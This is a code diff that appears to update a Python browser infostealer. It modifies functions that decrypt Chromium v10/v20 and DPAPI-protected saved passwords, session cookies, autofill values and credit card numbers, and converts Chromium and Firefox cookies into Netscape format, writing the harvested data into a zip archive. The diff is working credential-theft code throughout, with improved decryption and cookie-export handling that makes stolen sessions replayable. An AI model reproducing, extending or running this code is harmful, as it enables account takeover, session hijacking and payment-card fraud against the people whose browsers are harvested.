@@ -317,27 +317,31 @@ def decrypt_aes_gcm(encrypted_value, master_key):
     except:
         return None
 
-def decrypt_v10_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
+def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
     try:
-        if not encrypted_value:
+        if not encrypted_value or encrypted_value[:3] != b'v20':
             return ""
-        
-        # Modern Chromium (v10, v11 or v20)
-        prefix = encrypted_value[:3]
-        if prefix in (b'v10', b'v11', b'v20'):
-            decrypted = decrypt_aes_gcm(encrypted_value, master_key)
-            if decrypted:
-                if prefix == b'v20' and len(decrypted) > 32:
-                    return decrypted[32:].decode('utf-8', errors='replace')
-                return decrypted.decode('utf-8', errors='replace')
-        
-        # Legacy DPAPI (unprefixed or older v10)
-        try:
-            return windows.crypto.dpapi.unprotect(encrypted_value).decode('utf-8', errors='replace')
-        except:
-            pass
-            
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+        decrypted = cipher.decrypt_and_verify(payload, tag)
+        # v20 values (cookies/autofill) start after 32 bytes of metadata
+        return decrypted[32:].decode('utf-8', errors='replace')
+    except:
         return "DECRYPT_FAILED"
+
+def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
+    try:
+        if not encrypted_value or encrypted_value[:3] != b'v20':
+            return ""
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+        decrypted = cipher.decrypt_and_verify(payload, tag)
+        # v20 passwords contain raw data without prefix
+        return decrypted.decode('utf-8', errors='replace')
     except:
         return "DECRYPT_FAILED"
 
@@ -446,13 +450,21 @@ def process_chromium_browser(browser_name, config, master_key, zf):
             if conn:
                 try:
                     cur = conn.cursor()
-                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND LENGTH(password_value) > 0")
                     for url, user, pw in cur.fetchall():
-                        if pw and (pw.startswith(b'v10') or pw.startswith(b'v20')):
-                            dec = decrypt_v10_v20_value(pw, master_key)
+                        # v20 encryption
+                        if pw.startswith(b'v20'):
+                            dec = decrypt_v20_password(pw, master_key)
                             if dec and dec != "DECRYPT_FAILED":
                                 passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                        elif pw:
+                        # v10 encryption (older Chrome + DPAPI)
+                        elif pw.startswith(b'v10'):
+                            try:
+                                dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
+                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                            except: pass
+                        # Legacy DPAPI (unprefixed)
+                        else:
                             try:
                                 dec = windows.crypto.dpapi.unprotect(pw).decode('utf-8', errors='replace')
                                 passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
@@ -477,11 +489,41 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                         cur = conn.cursor()
                         cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
                         for host, name, path, exp, sec, httpo, enc in cur.fetchall():
-                            dec = decrypt_v10_v20_value(enc, master_key)
-                            if dec and dec != "DECRYPT_FAILED":
-                                # Clean value for Netscape format: strip newlines and tabs which break the format
-                                safe_dec = dec.replace('\n', '').replace('\r', '').replace('\t', ' ')
-                                line = f"{host}\tTRUE\t{path}\t{str(bool(sec)).upper()}\t{exp}\t{name}\t{safe_dec}\n"
+                            if not enc: continue
+                            
+                            dec = None
+                            if enc.startswith(b'v20'):
+                                dec = decrypt_v20_value(enc, master_key)
+                            elif enc.startswith(b'v10'):
+                                try:
+                                    dec = windows.crypto.dpapi.unprotect(enc[3:]).decode('utf-8', errors='replace')
+                                except: pass
+                            
+                            if dec and dec != "DECRYPT_FAILED" and name and host:
+                                # URL-encode for safety
+                                safe_dec = urllib.parse.quote(dec)
+                                
+                                # Check if size exceeds 4KB browser limit
+                                if len(safe_dec) > 4096:
+                                    compact_dec = dec.replace('\n', '').replace('\r', '').replace('\t', ' ').replace(';', '%3B')
+                                    if len(compact_dec) <= 4096:
+                                        safe_dec = compact_dec
+                                    else:
+                                        continue 
+
+                                # Cleanup other fields to prevent format breakage
+                                name_s = str(name).replace('\t', ' ').replace('\n', '').replace('\r', '')
+                                host_s = str(host).replace('\t', ' ').replace('\n', '').replace('\r', '')
+                                path_s = str(path if path else "/").replace('\t', ' ').replace('\n', '').replace('\r', '')
+
+                                # Convert Chromium timestamp (microseconds since 1601) to Unix timestamp (seconds since 1970)
+                                try:
+                                    secs = int(exp) // 1000000
+                                    unix_exp = secs - 11644473600 if secs > 11644473600 else 0
+                                except:
+                                    unix_exp = 0
+
+                                line = f"{host_s}\tTRUE\t{path_s}\t{str(bool(sec)).upper()}\t{unix_exp}\t{name_s}\t{safe_dec}\n"
                                 cookies_content += line
                         conn.close()
                         if cookies_content.strip():
@@ -514,8 +556,11 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                         cur.execute("SELECT name, value FROM autofill")
                         for name, val in cur.fetchall():
                             if name:
-                                if isinstance(val, bytes) and (val.startswith(b'v10') or val.startswith(b'v11') or val.startswith(b'v20')):
-                                    dec = decrypt_v10_v20_value(val, master_key)
+                                if isinstance(val, bytes) and val.startswith(b'v20'):
+                                    dec = decrypt_v20_value(val, master_key)
+                                elif isinstance(val, bytes) and val.startswith(b'v10'):
+                                    try: dec = windows.crypto.dpapi.unprotect(val[3:]).decode('utf-8', errors='replace')
+                                    except: dec = str(val)
                                 else:
                                     dec = str(val) if val else ""
                                 autofill_content += f"Field: {name}\nValue: {dec}\n\n"
@@ -523,15 +568,16 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                     
                     # Credit Cards
                     try:
-                        cur.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-                        for guid, name, exp_m, exp_y, enc_num in cur.fetchall():
-                            dec_num = decrypt_v10_v20_value(enc_num, master_key)
-                            cvc = "N/A"
-                            if guid in local_cvcs:
-                                dec_cvc = decrypt_v10_v20_value(local_cvcs[guid], master_key)
-                                if dec_cvc and dec_cvc != "DECRYPT_FAILED":
-                                    cvc = dec_cvc
-                            credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\nCVC: {cvc}\n\n"
+                        cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                        for name, exp_m, exp_y, enc_num in cur.fetchall():
+                            dec_num = "Unknown"
+                            if enc_num and enc_num.startswith(b'v20'):
+                                dec_num = decrypt_v20_password(enc_num, master_key) 
+                            elif enc_num and enc_num.startswith(b'v10'):
+                                try: dec_num = windows.crypto.dpapi.unprotect(enc_num[3:]).decode('utf-8', errors='replace')
+                                except: pass
+                            
+                            credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
                     except: pass
 
                     conn.close()
@@ -578,9 +624,26 @@ def process_firefox_browser(browser_name, config, zf):
                 cur = con.cursor()
                 cur.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
                 for host, name, value, path, expiry, secure in cur.fetchall():
-                    # Clean value for Netscape format
-                    safe_val = value.replace('\n', '').replace('\r', '').replace('\t', ' ')
-                    cookies_content += f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expiry}\t{name}\t{safe_val}\n"
+                    if not host or not name or not value:
+                        continue
+
+                    # URL-encode value for maximum compatibility
+                    safe_val = urllib.parse.quote(value)
+                    
+                    # Check size limit
+                    if len(safe_val) > 4096:
+                        compact_val = value.replace('\n', '').replace('\r', '').replace('\t', ' ').replace(';', '%3B')
+                        if len(compact_val) <= 4096:
+                            safe_val = compact_val
+                        else:
+                            continue
+
+                    # Cleanup other fields
+                    host_c = str(host).replace('\t', ' ').replace('\n', '').replace('\r', '')
+                    name_c = str(name).replace('\t', ' ').replace('\n', '').replace('\r', '')
+                    path_c = str(path).replace('\t', ' ').replace('\n', '').replace('\r', '')
+
+                    cookies_content += f"{host_c}\tTRUE\t{path_c}\t{str(bool(secure)).upper()}\t{expiry}\t{name_c}\t{safe_val}\n"
                 con.close()
                 if cookies_content: write_to_zip(zf, prefix + "cookies.txt", cookies_content)
             except: pass
